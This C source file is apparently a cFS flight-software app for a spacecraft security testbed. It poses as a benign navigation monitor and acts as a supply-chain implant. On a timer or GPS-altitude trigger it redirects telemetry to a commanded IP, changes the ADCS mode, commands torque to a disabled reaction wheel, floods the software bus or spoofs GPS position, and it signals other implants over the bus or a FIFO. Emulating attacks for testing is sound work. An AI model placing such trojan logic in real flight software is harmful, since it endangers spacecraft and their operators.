#include "sc_vendor_nav_app.h"

#include <fcntl.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#include "novatel_oem615_msg.h"
#include "novatel_oem615_msgids.h"
#include "to_lab_msg.h"
#include "to_lab_msgids.h"

#include "sp001_sb_spoof_targets.h"
#include "sp001_sb_spoof_msg.h"
#include "sp003_app_crash_restart_app.h"
#include "sp006_payload_abuse_profiles.h"
#include "sp007_resource_exhaustion_app.h"
#include "sp007_resource_exhaustion_profiles.h"
#include "sc_vendor_sp008_adapter.h"

SC_VENDOR_NAV_AppData_t SC_VENDOR_NAV_AppData;

static int32 SC_VENDOR_NAV_AppInit(void);
static void  SC_VENDOR_NAV_ProcessPacket(void);
static void  SC_VENDOR_NAV_ProcessCommand(void);
static void  SC_VENDOR_NAV_ProcessNovatel(const NOVATEL_OEM615_Device_tlm_t *packet);
static void  SC_VENDOR_NAV_ReportHousekeeping(void);
static void  SC_VENDOR_NAV_Trigger(void);
static int32 SC_VENDOR_NAV_Exfil(void);
static int32 SC_VENDOR_NAV_DispatchPayload(void);
static int32 SC_VENDOR_NAV_SendCoordination(void);
static int32 SC_VENDOR_NAV_WriteFifo(void);
static void  SC_VENDOR_NAV_Reset(void);
static int32 SC_VENDOR_NAV_VerifyLength(CFE_MSG_Size_t expected);

void SCVN_AppMain(void)
{
    int32 status = SC_VENDOR_NAV_AppInit();

    CFE_ES_PerfLogEntry(SC_VENDOR_NAV_PERF_ID);
    if (status != CFE_SUCCESS)
    {
        SC_VENDOR_NAV_AppData.RunStatus = CFE_ES_RunStatus_APP_ERROR;
    }

    while (CFE_ES_RunLoop(&SC_VENDOR_NAV_AppData.RunStatus))
    {
        CFE_ES_PerfLogExit(SC_VENDOR_NAV_PERF_ID);
        status = CFE_SB_ReceiveBuffer((CFE_SB_Buffer_t **)&SC_VENDOR_NAV_AppData.MsgPtr,
                                      SC_VENDOR_NAV_AppData.CmdPipe, SC_VENDOR_NAV_TIMEOUT_MS);
        CFE_ES_PerfLogEntry(SC_VENDOR_NAV_PERF_ID);

        if (status == CFE_SUCCESS)
        {
            SC_VENDOR_NAV_ProcessPacket();
        }
        else if (status == CFE_SB_TIME_OUT || status == CFE_SB_NO_MESSAGE)
        {
            if (SC_VENDOR_NAV_AppData.Armed && SC_VENDOR_NAV_AppData.TriggerMode == SC_VENDOR_TRIGGER_STATIC)
            {
                SC_VENDOR_NAV_AppData.ElapsedMs += SC_VENDOR_NAV_TIMEOUT_MS;
                if (SC_VENDOR_NAV_AppData.ElapsedMs >= SC_VENDOR_NAV_AppData.StaticDelayMs)
                {
                    SC_VENDOR_NAV_Trigger();
                }
            }
        }
        else
        {
            CFE_EVS_SendEvent(SC_VENDOR_NAV_ERROR_EID, CFE_EVS_EventType_ERROR,
                              "SC_VENDOR_NAV: SB receive failed: %d", (int)status);
            SC_VENDOR_NAV_AppData.RunStatus = CFE_ES_RunStatus_APP_ERROR;
        }
    }

    CFE_ES_PerfLogExit(SC_VENDOR_NAV_PERF_ID);
    CFE_ES_ExitApp(SC_VENDOR_NAV_AppData.RunStatus);
}

static int32 SC_VENDOR_NAV_AppInit(void)
{
    int32 status;

    memset(&SC_VENDOR_NAV_AppData, 0, sizeof(SC_VENDOR_NAV_AppData));
    SC_VENDOR_NAV_AppData.RunStatus = CFE_ES_RunStatus_APP_RUN;
    SC_VENDOR_NAV_AppData.TriggerMode = SC_VENDOR_TRIGGER_STATIC;
    SC_VENDOR_NAV_AppData.CoordinationMode = SC_VENDOR_COORD_NONE;
    SC_VENDOR_NAV_AppData.Payload = SC_VENDOR_PAYLOAD_EXFIL;
    SC_VENDOR_NAV_AppData.StaticDelayMs = 5000;
    strncpy(SC_VENDOR_NAV_AppData.DestinationIp, "active-gs",
            sizeof(SC_VENDOR_NAV_AppData.DestinationIp) - 1);

    status = CFE_EVS_Register(NULL, 0, CFE_EVS_EventFilter_BINARY);
    if (status != CFE_SUCCESS)
    {
        return status;
    }

    status = CFE_SB_CreatePipe(&SC_VENDOR_NAV_AppData.CmdPipe, SC_VENDOR_NAV_PIPE_DEPTH, "SC_VENDOR_NAV_PIPE");
    if (status != CFE_SUCCESS)
    {
        return status;
    }
    CFE_SB_Subscribe(CFE_SB_ValueToMsgId(SC_VENDOR_NAV_CMD_MID), SC_VENDOR_NAV_AppData.CmdPipe);
    CFE_SB_Subscribe(CFE_SB_ValueToMsgId(SC_VENDOR_NAV_REQ_HK_MID), SC_VENDOR_NAV_AppData.CmdPipe);
    CFE_SB_Subscribe(CFE_SB_ValueToMsgId(NOVATEL_OEM615_DEVICE_TLM_MID), SC_VENDOR_NAV_AppData.CmdPipe);

    CFE_MSG_Init(CFE_MSG_PTR(SC_VENDOR_NAV_AppData.HkTelemetryPkt.TlmHeader),
                 CFE_SB_ValueToMsgId(SC_VENDOR_NAV_HK_TLM_MID), sizeof(SC_VENDOR_NAV_AppData.HkTelemetryPkt));
    CFE_EVS_SendEvent(SC_VENDOR_NAV_INIT_EID, CFE_EVS_EventType_INFORMATION,
                      "SC_VENDOR_NAV: benign vendor navigation monitor initialized");
    return CFE_SUCCESS;
}

static void SC_VENDOR_NAV_ProcessPacket(void)
{
    CFE_SB_MsgId_t msg_id = CFE_SB_INVALID_MSG_ID;
    CFE_MSG_GetMsgId(SC_VENDOR_NAV_AppData.MsgPtr, &msg_id);

    if (CFE_SB_MsgIdToValue(msg_id) == NOVATEL_OEM615_DEVICE_TLM_MID)
    {
        SC_VENDOR_NAV_ProcessNovatel((const NOVATEL_OEM615_Device_tlm_t *)SC_VENDOR_NAV_AppData.MsgPtr);
    }
    else if (CFE_SB_MsgIdToValue(msg_id) == SC_VENDOR_NAV_CMD_MID)
    {
        SC_VENDOR_NAV_ProcessCommand();
    }
    else if (CFE_SB_MsgIdToValue(msg_id) == SC_VENDOR_NAV_REQ_HK_MID)
    {
        SC_VENDOR_NAV_ReportHousekeeping();
    }
}

static void SC_VENDOR_NAV_ProcessNovatel(const NOVATEL_OEM615_Device_tlm_t *packet)
{
    SC_VENDOR_NAV_AppData.HkTelemetryPkt.NovatelPacketCount++;
    SC_VENDOR_NAV_AppData.HkTelemetryPkt.LastLatitude = packet->Novatel_oem615.lat;
    SC_VENDOR_NAV_AppData.HkTelemetryPkt.LastAltitude = packet->Novatel_oem615.alt;

    if (SC_VENDOR_NAV_AppData.Armed && SC_VENDOR_NAV_AppData.TriggerMode == SC_VENDOR_TRIGGER_NOVATEL &&
        packet->Novatel_oem615.alt >= SC_VENDOR_NAV_AppData.TriggerAltitudeM)
    {
        SC_VENDOR_NAV_Trigger();
    }
}

static void SC_VENDOR_NAV_ProcessCommand(void)
{
    CFE_MSG_FcnCode_t code = 0;
    CFE_MSG_GetFcnCode(SC_VENDOR_NAV_AppData.MsgPtr, &code);

    if (code == SC_VENDOR_NAV_NOOP_CC)
    {
        SC_VENDOR_NAV_AppData.HkTelemetryPkt.CommandCount++;
    }
    else if (code == SC_VENDOR_NAV_RESET_CC)
    {
        SC_VENDOR_NAV_Reset();
    }
    else if (code == SC_VENDOR_NAV_ARM_CC)
    {
        if (SC_VENDOR_NAV_VerifyLength(sizeof(SC_VENDOR_NAV_NoArgsCmd_t)) == CFE_SUCCESS)
        {
            SC_VENDOR_NAV_AppData.Armed = true;
            SC_VENDOR_NAV_AppData.Triggered = false;
            SC_VENDOR_NAV_AppData.ElapsedMs = 0;
            SC_VENDOR_NAV_AppData.HkTelemetryPkt.CommandCount++;
        }
    }
    else if (code == SC_VENDOR_NAV_STOP_CC)
    {
        SC_VENDOR_NAV_AppData.Armed = false;
        SC_VENDOR_NAV_AppData.HkTelemetryPkt.CommandCount++;
    }
    else if (code == SC_VENDOR_NAV_SET_PROFILE_CC)
    {
        SC_VENDOR_NAV_SetProfileCmd_t *cmd = (SC_VENDOR_NAV_SetProfileCmd_t *)SC_VENDOR_NAV_AppData.MsgPtr;
        if (SC_VENDOR_NAV_VerifyLength(sizeof(*cmd)) == CFE_SUCCESS)
        {
            SC_VENDOR_NAV_AppData.TriggerMode = cmd->TriggerMode;
            SC_VENDOR_NAV_AppData.CoordinationMode = cmd->CoordinationMode;
            SC_VENDOR_NAV_AppData.Payload = cmd->Payload;
            SC_VENDOR_NAV_AppData.StaticDelayMs = cmd->StaticDelayMs;
            SC_VENDOR_NAV_AppData.TriggerAltitudeM = cmd->TriggerAltitudeM;
            strncpy(SC_VENDOR_NAV_AppData.DestinationIp, cmd->DestinationIp,
                    sizeof(SC_VENDOR_NAV_AppData.DestinationIp) - 1);
            SC_VENDOR_NAV_AppData.HkTelemetryPkt.CommandCount++;
        }
    }
    else
    {
        SC_VENDOR_NAV_AppData.HkTelemetryPkt.CommandErrorCount++;
        CFE_EVS_SendEvent(SC_VENDOR_NAV_CMD_EID, CFE_EVS_EventType_ERROR,
                          "SC_VENDOR_NAV: unsupported function code %u", (unsigned)code);
    }
}

static void SC_VENDOR_NAV_Trigger(void)
{
    if (!SC_VENDOR_NAV_AppData.Armed || SC_VENDOR_NAV_AppData.Triggered)
    {
        return;
    }

    SC_VENDOR_NAV_AppData.Triggered = true;
    SC_VENDOR_NAV_AppData.HkTelemetryPkt.Triggered = 1;
    SC_VENDOR_NAV_AppData.HkTelemetryPkt.TriggerMode = SC_VENDOR_NAV_AppData.TriggerMode;
    SC_VENDOR_NAV_AppData.HkTelemetryPkt.CoordinationMode = SC_VENDOR_NAV_AppData.CoordinationMode;
    SC_VENDOR_NAV_AppData.HkTelemetryPkt.Payload = SC_VENDOR_NAV_AppData.Payload;
    CFE_EVS_SendEvent(SC_VENDOR_NAV_TRIGGER_EID, CFE_EVS_EventType_INFORMATION,
                      "SC_VENDOR_NAV: supply-chain trigger activated");

    SC_VENDOR_NAV_DispatchPayload();
    if (SC_VENDOR_NAV_AppData.CoordinationMode == SC_VENDOR_COORD_SOFTWARE_BUS)
    {
        SC_VENDOR_NAV_SendCoordination();
    }
    else if (SC_VENDOR_NAV_AppData.CoordinationMode == SC_VENDOR_COORD_POSIX_FIFO)
    {
        SC_VENDOR_NAV_WriteFifo();
    }
}

static int32 SC_VENDOR_NAV_DispatchPayload(void)
{
    int32 status = CFE_SUCCESS;

    switch (SC_VENDOR_NAV_AppData.Payload)
    {
        case SC_VENDOR_PAYLOAD_EXFIL:
            status = SC_VENDOR_NAV_Exfil();
            break;
        case SC_VENDOR_PAYLOAD_SP001:
        {
            SP001_RunProfileCmd_t cmd;
            memset(&cmd, 0, sizeof(cmd));
            cmd.ProfileId = SP001_PROFILE_ADCS_SET_MODE;
            cmd.Arg1 = 2; /* native ADCS safe/passive mode used by SP001 verifier */
            status = SP001_RunProfile(&cmd);
            if (status == CFE_SUCCESS)
            {
                /* Restore the nominal ADCS mode before releasing the carrier. */
                cmd.Arg1 = 3;
                status = SP001_RunProfile(&cmd);
            }
            SC_VENDOR_NAV_AppData.HkTelemetryPkt.LastPayloadProfile = cmd.ProfileId;
            break;
        }
        case SC_VENDOR_PAYLOAD_SP003:
            status = SP003_BenchmarkRunBounded(32);
            SC_VENDOR_NAV_AppData.HkTelemetryPkt.LastPayloadProfile = SP003_PROFILE_EVENT_BURST;
            break;
        case SC_VENDOR_PAYLOAD_SP006:
        {
            SP006_RunProfileCmd_t cmd;
            SP006_ProfileResult_t result;
            memset(&cmd, 0, sizeof(cmd));
            cmd.ProfileId = SP006_PROFILE_RW_DISABLED_SET_TORQUE;
            cmd.RepeatCount = 1;
            cmd.DelayMs = 0;
            cmd.Arg1 = 0;
            cmd.Arg2 = 1;
            status = SP006_RunProfile(&cmd, &result);
            SC_VENDOR_NAV_AppData.HkTelemetryPkt.LastPayloadProfile = cmd.ProfileId;
            break;
        }
        case SC_VENDOR_PAYLOAD_SP007:
        {
            SP007_StartProfileCmd_t cmd;
            memset(&cmd, 0, sizeof(cmd));
            cmd.ProfileId = SP007_PROFILE_SB_TELEMETRY_FLOOD;
            cmd.DurationMs = 1000; /* bounded pressure; verifier requires cleanup */
            cmd.RateOrYield = 20;
            cmd.Limit = 64;
            SC_VENDOR_NAV_AppData.RunStatus = CFE_ES_RunStatus_APP_RUN;
            status = SP007_StartProfile(&cmd);
            if (status == CFE_SUCCESS)
            {
                SP007_StopProfile();
                SP007_CleanupResources();
                SC_VENDOR_NAV_AppData.HkTelemetryPkt.PayloadRecoveryCount++;
            }
            SC_VENDOR_NAV_AppData.HkTelemetryPkt.LastPayloadProfile = cmd.ProfileId;
            break;
        }
        case SC_VENDOR_PAYLOAD_SP008:
            status = SP008_BenchmarkStart(SP008_PROFILE_GPS_POSITION_SPOOF_WHILE_REAL_ORBIT_NOMINAL);
            SP008_BenchmarkStop();
            SC_VENDOR_NAV_AppData.HkTelemetryPkt.LastPayloadProfile = SP008_PROFILE_GPS_POSITION_SPOOF_WHILE_REAL_ORBIT_NOMINAL;
            SC_VENDOR_NAV_AppData.HkTelemetryPkt.PayloadRecoveryCount++;
            break;
        default:
            status = CFE_STATUS_BAD_COMMAND_CODE;
            break;
    }

    SC_VENDOR_NAV_AppData.HkTelemetryPkt.PayloadInvokeCount++;
    SC_VENDOR_NAV_AppData.HkTelemetryPkt.LastPayloadStatus = status;
    if (status == CFE_SUCCESS)
    {
        SC_VENDOR_NAV_AppData.HkTelemetryPkt.PayloadRecoveryCount++;
    }
    CFE_EVS_SendEvent(SC_VENDOR_NAV_TRIGGER_EID,
                      status == CFE_SUCCESS ? CFE_EVS_EventType_INFORMATION : CFE_EVS_EventType_ERROR,
                      "SC_VENDOR_NAV: payload %u dispatched to native target, status=%d",
                      (unsigned)SC_VENDOR_NAV_AppData.Payload, (int)status);
    return status;
}

static int32 SC_VENDOR_NAV_Exfil(void)
{
    TO_LAB_EnableOutputCmd_t cmd;
    memset(&cmd, 0, sizeof(cmd));
    CFE_MSG_Init(CFE_MSG_PTR(cmd.CmdHeader), CFE_SB_ValueToMsgId(TO_LAB_CMD_MID), sizeof(cmd));
    CFE_MSG_SetFcnCode(CFE_MSG_PTR(cmd.CmdHeader), TO_LAB_OUTPUT_ENABLE_CC);
    strncpy(cmd.Payload.dest_IP, SC_VENDOR_NAV_AppData.DestinationIp, sizeof(cmd.Payload.dest_IP) - 1);
    CFE_SB_TimeStampMsg(CFE_MSG_PTR(cmd.CmdHeader));
    SC_VENDOR_NAV_AppData.HkTelemetryPkt.ExfilCommandCount++;
    return CFE_SB_TransmitMsg(CFE_MSG_PTR(cmd.CmdHeader), true);
}

static int32 SC_VENDOR_NAV_SendCoordination(void)
{
    SC_VENDOR_CoordMsg_t msg;
    memset(&msg, 0, sizeof(msg));
    CFE_MSG_Init(CFE_MSG_PTR(msg.TlmHeader), CFE_SB_ValueToMsgId(SC_VENDOR_COORD_MID), sizeof(msg));
    msg.Magic = SC_VENDOR_NAV_TRIGGER_MAGIC;
    msg.Payload = SC_VENDOR_NAV_AppData.Payload;
    CFE_SB_TimeStampMsg(CFE_MSG_PTR(msg.TlmHeader));
    SC_VENDOR_NAV_AppData.HkTelemetryPkt.CoordinationCount++;
    return CFE_SB_TransmitMsg(CFE_MSG_PTR(msg.TlmHeader), true);
}

static int32 SC_VENDOR_NAV_WriteFifo(void)
{
#ifdef __linux__
    int fd;
    (void)mkfifo(SC_VENDOR_NAV_FIFO_PATH, 0666);
    fd = open(SC_VENDOR_NAV_FIFO_PATH, O_WRONLY | O_NONBLOCK);
    if (fd < 0)
    {
        return CFE_STATUS_EXTERNAL_RESOURCE_FAIL;
    }
    (void)write(fd, "SC_VENDOR_TRIGGER", 18);
    close(fd);
    SC_VENDOR_NAV_AppData.HkTelemetryPkt.CoordinationCount++;
    return CFE_SUCCESS;
#else
    return CFE_STATUS_NOT_IMPLEMENTED;
#endif
}

static void SC_VENDOR_NAV_ReportHousekeeping(void)
{
    SC_VENDOR_NAV_AppData.HkTelemetryPkt.Armed = SC_VENDOR_NAV_AppData.Armed;
    SC_VENDOR_NAV_AppData.HkTelemetryPkt.Triggered = SC_VENDOR_NAV_AppData.Triggered;
    CFE_SB_TimeStampMsg(CFE_MSG_PTR(SC_VENDOR_NAV_AppData.HkTelemetryPkt.TlmHeader));
    CFE_SB_TransmitMsg(CFE_MSG_PTR(SC_VENDOR_NAV_AppData.HkTelemetryPkt.TlmHeader), true);
}

static void SC_VENDOR_NAV_Reset(void)
{
    SC_VENDOR_NAV_AppData.HkTelemetryPkt.CommandErrorCount = 0;
    SC_VENDOR_NAV_AppData.HkTelemetryPkt.CommandCount = 0;
    SC_VENDOR_NAV_AppData.HkTelemetryPkt.NovatelPacketCount = 0;
    SC_VENDOR_NAV_AppData.HkTelemetryPkt.CoordinationCount = 0;
    SC_VENDOR_NAV_AppData.HkTelemetryPkt.ExfilCommandCount = 0;
    SC_VENDOR_NAV_AppData.HkTelemetryPkt.PayloadInvokeCount = 0;
    SC_VENDOR_NAV_AppData.HkTelemetryPkt.LastPayloadStatus = 0;
    SC_VENDOR_NAV_AppData.HkTelemetryPkt.LastPayloadProfile = 0;
    SC_VENDOR_NAV_AppData.HkTelemetryPkt.PayloadRecoveryCount = 0;
    SC_VENDOR_NAV_AppData.Triggered = false;
}

static int32 SC_VENDOR_NAV_VerifyLength(CFE_MSG_Size_t expected)
{
    CFE_MSG_Size_t actual = 0;
    if (CFE_MSG_GetSize(SC_VENDOR_NAV_AppData.MsgPtr, &actual) != CFE_SUCCESS || actual < expected)
    {
        SC_VENDOR_NAV_AppData.HkTelemetryPkt.CommandErrorCount++;
        return CFE_STATUS_WRONG_MSG_LENGTH;
    }
    return CFE_SUCCESS;
}
